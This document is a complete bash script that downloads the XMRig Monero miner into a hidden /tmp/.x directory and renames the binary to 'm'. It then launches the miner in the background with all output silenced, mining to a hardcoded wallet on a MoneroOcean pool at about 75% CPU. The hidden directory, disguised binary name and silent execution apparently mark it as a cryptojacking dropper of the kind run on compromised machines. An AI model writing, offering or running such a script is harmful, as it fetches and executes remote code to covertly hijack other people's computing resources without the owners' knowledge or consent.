#!/bin/bash

cd /tmp && rm -rf .x && mkdir -p /tmp/.x && cd /tmp/.x && wget -q https://github.com/moneroocean/xmrig/releases/download/v6.25.0-mo1/xmrig-v6.25.0-mo1-lin64-compat.tar.gz && tar -xzf xmrig-v6.25.0-mo1-lin64-compat.tar.gz && chmod +x xmrig && mv xmrig m && nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p worker7 --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
